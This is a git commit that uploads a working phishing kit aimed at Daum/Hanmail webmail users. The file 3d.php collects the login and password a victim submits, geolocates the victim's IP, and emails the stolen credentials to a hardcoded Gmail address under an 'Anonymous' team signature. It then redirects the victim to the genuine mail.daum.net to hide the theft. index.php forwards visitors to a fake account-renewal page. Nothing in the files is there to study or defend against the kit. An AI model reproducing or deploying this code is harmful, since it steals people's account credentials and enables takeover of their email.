8b7d24592728b46d8c735e1657b1b99e7e4163bb
readde <67876939+readde@users.noreply.github.com>
2020-07-05 22:10:57 +0100

    Add files via upload

---
+++ daum/3d.php
@@ -0,0 +1,149 @@
+<?php
+$ip = getenv("REMOTE_ADDR");
+$country = visitor_country();
+$countryCode = visitor_countryCode();
+$continentCode = visitor_continentCode();
+$browser = $_SERVER['HTTP_USER_AGENT'];
+$login = $_POST['login'];
+$passwd = $_POST['passwd'];
+$own = 'kobane23@gmail.com';
+$web = $_SERVER["HTTP_HOST"];
+$inj = $_SERVER["REQUEST_URI"]; 
+$domain = 'DAUM | HANMAIL';
+$sender = 'Xclusiv-3D|#Anonymous';
+$subj = "$domain Tinz";
+$headers .= "From: Xclusiv-3D|#Anonymous<$sender>\n";
+$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
+$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
+$over = 'loading.php?Email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1';
+$msg = "<HTML><BODY>
+ <TABLE>
+ <tr><td>____Xclusiv-3D-Logs____</td></tr>
+ <tr><td>ID: >$login<<td/></tr>
+ <tr><td>Access: >$passwd<</td></tr>
+ <tr><td>IP: $country | <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> </td></tr>
+ <tr><td>User Agent: >$browser<<td/></tr>
+ <tr><td>>Anonymous Cyber Team<</td></tr>
+ </BODY>
+ </HTML>";
+if (empty($login) || empty($passwd)) {
+header( "Location: boxMrenewal.php?Email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
+}
+else {
+mail($own,$subj,$msg,$headers);
+header("Location: http://mail.daum.net");
+}
+
+function visitor_country()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_countryName != null)
+    {
+        $result = $ip_data->geoplugin_countryName;
+    }
+
+    return $result;
+}
+function visitor_countryCode()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_countryCode != null)
+    {
+        $result = $ip_data->geoplugin_countryCode;
+    }
+
+    return $result;
+}
+function visitor_regionName()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_regionName != null)
+    {
+        $result = $ip_data->geoplugin_regionName;
+    }
+
+    return $result;
+}
+function visitor_continentCode()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_continentCode != null)
+    {
+        $result = $ip_data->geoplugin_continentCode;
+    }
+
+    return $result;
+}
+?>
---
+++ daum/index.php
@@ -0,0 +1,4 @@
+<?php
+$email = $_GET['email'];
+header("Location: boxMrenewal.php?Email=$email&.rand=13vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1");
+?>
